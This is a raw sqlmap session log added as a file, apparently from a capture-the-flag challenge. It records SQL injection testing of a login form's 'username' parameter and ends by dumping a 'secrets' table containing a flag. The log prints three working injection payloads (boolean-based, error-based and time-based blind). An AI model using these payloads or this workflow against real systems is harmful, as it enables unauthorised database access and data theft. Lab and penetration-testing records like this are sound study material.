@@ -1,0 +1,124 @@
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.9.2#stable}
+|_ -| . [,]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 14:49:57 /2025-04-27/
+
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[14:49:57] [INFO] starting crawler for target URL 'http://23.179.17.40:58001/'
+[14:49:57] [INFO] searching for links with depth 1
+do you want to normalize crawling results [Y/n] Y
+do you want to store crawling results to a temporary file for eventual further processing with other tools [y/N] N
+[1/1] Form:
+POST http://23.179.17.40:58001/
+POST data: username=&password=&login=Login
+do you want to test this form? [Y/n/q] 
+> Y
+Edit POST data [default: username=&password=&login=Login] (Warning: blank fields detected): username=&password=&login=Login
+do you want to fill blank fields with random values? [Y/n] Y
+[14:49:58] [INFO] using '/home/silly-lilly/.local/share/sqlmap/output/results-04272025_0249pm.csv' as the CSV results file in multiple targets mode
+you have not declared cookie(s), while server wants to set its own ('PHPSESSID=4cfd11a88a3...d7b93eaf2d'). Do you want to use those [Y/n] Y
+[14:49:58] [INFO] checking if the target is protected by some kind of WAF/IPS
+[14:49:58] [INFO] testing if the target URL content is stable
+[14:49:59] [INFO] target URL content is stable
+[14:49:59] [INFO] testing if POST parameter 'username' is dynamic
+[14:49:59] [WARNING] POST parameter 'username' does not appear to be dynamic
+[14:49:59] [INFO] heuristic (basic) test shows that POST parameter 'username' might be injectable (possible DBMS: 'MySQL')
+[14:49:59] [INFO] testing for SQL injection on POST parameter 'username'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
+[14:49:59] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[14:49:59] [WARNING] reflective value(s) found and filtering out
+[14:50:00] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[14:50:00] [INFO] testing 'Generic inline queries'
+[14:50:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[14:50:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+got a 302 redirect to 'http://23.179.17.40:58001/admin.php'. Do you want to follow? [Y/n] Y
+redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] N
+[14:50:07] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
+[14:50:07] [INFO] POST parameter 'username' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)' injectable (with --string="Login")
+[14:50:07] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[14:50:07] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[14:50:07] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[14:50:07] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[14:50:07] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[14:50:07] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[14:50:07] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
+[14:50:07] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[14:50:08] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[14:50:08] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[14:50:08] [INFO] POST parameter 'username' is 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
+[14:50:08] [INFO] testing 'MySQL inline queries'
+[14:50:08] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[14:50:08] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[14:50:08] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[14:50:08] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[14:50:08] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+[14:50:08] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
+[14:50:08] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[14:50:19] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+[14:50:19] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[14:50:19] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
+[14:50:19] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[14:50:19] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[14:50:19] [INFO] target URL appears to have 4 columns in query
+do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
+injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
+[14:50:24] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
+[14:50:25] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
+[14:50:27] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
+[14:50:28] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
+[14:50:29] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
+[14:50:31] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
+[14:50:32] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
+[14:50:34] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
+[14:50:35] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
+[14:50:36] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
+[14:50:38] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
+POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 363 HTTP(s) requests:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: username=QCtL' OR NOT 7937=7937#&password=WRKe&login=Login
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=QCtL' OR (SELECT 6463 FROM(SELECT COUNT(*),CONCAT(0x716a6b6b71,(SELECT (ELT(6463=6463,1))),0x7178786b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- PshA&password=WRKe&login=Login
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=QCtL' AND (SELECT 9837 FROM (SELECT(SLEEP(5)))sjtP)-- MWKP&password=WRKe&login=Login
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[14:50:38] [INFO] the back-end DBMS is MySQL
+web application technology: PHP 8.2.28, Apache 2.4.63, PHP
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+[14:50:39] [INFO] fetching columns for table 'secrets' in database 'app'
+[14:50:39] [INFO] retrieved: 'name'
+[14:50:39] [INFO] retrieved: 'varchar(255)'
+[14:50:39] [INFO] retrieved: 'value'
+[14:50:39] [INFO] retrieved: 'varchar(255)'
+[14:50:39] [INFO] fetching entries for table 'secrets' in database 'app'
+[14:50:39] [INFO] retrieved: 'flag'
+[14:50:39] [INFO] retrieved: 'CIT{36b0efd6c2ec7132}'
+Database: app
+Table: secrets
+[1 entry]
++--------+-----------------------+
+| name   | value                 |
++--------+-----------------------+
+| flag   | CIT{36b0efd6c2ec7132} |
++--------+-----------------------+
+
+[14:50:39] [INFO] table 'app.secrets' dumped to CSV file '/home/silly-lilly/.local/share/sqlmap/output/23.179.17.40/dump/app/secrets.csv'
+[14:50:39] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/silly-lilly/.local/share/sqlmap/output/results-04272025_0249pm.csv'
+
+[*] ending @ 14:50:39 /2025-04-27/
+
